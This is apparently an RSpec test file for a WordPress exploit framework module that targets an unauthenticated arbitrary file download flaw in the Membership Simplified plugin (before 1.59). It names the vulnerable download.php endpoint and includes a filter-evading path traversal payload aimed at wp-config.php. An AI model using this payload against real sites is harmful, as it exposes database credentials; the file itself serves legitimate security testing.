# frozen_string_literal: true

require_relative '../../../../../spec_helper'
require 'wpxf/modules'

describe Wpxf::Auxiliary::MembershipSimplifiedArbitraryFileDownload do
  let(:subject) { described_class.new }

  before :each, 'setup subject' do
    allow(subject).to receive(:check_plugin_version_from_readme)
    allow(subject).to receive(:emit_error)
  end

  it 'should return a {Wpxf::Module}' do
    expect(subject).to be_a Wpxf::Module
  end

  it 'should check the change log to verify the version is < 1.59' do
    res_mock = Wpxf::Net::HttpResponse.new(nil)
    res_mock.code = 200
    res_mock.body = %(
      = Beta 1.58 =
      Release notes

      = Beta 1.57 =
      Release Notes
    )

    allow(subject).to receive(:execute_get_request).and_return(res_mock)
    expect(subject.check).to eql :vulnerable
  end

  it 'should not require authentication' do
    expect(subject.requires_authentication).to be false
  end

  it 'should configure a default remote file path' do
    expected = '..././..././..././wp-config.php'
    expect(subject.default_remote_file_path).to eql expected
  end

  it 'should configure the working directory' do
    expected = 'wp-content/plugins/membership-simplified-for-oap-members-only'
    expect(subject.working_directory).to eql expected
  end

  it 'should configure the downloader url' do
    url_pattern = %r{plugins/membership-simplified-for-oap-members-only/download\.php$}
    expect(subject.downloader_url).to match(url_pattern)
  end

  it 'should configure the request params' do
    subject.set_option_value('remote_file', 'test.php')
    expect(subject.download_request_params).to eql('download_file' => 'test.php')
  end

  it 'should GET the download request' do
    expect(subject.download_request_method).to eql :get
  end
end
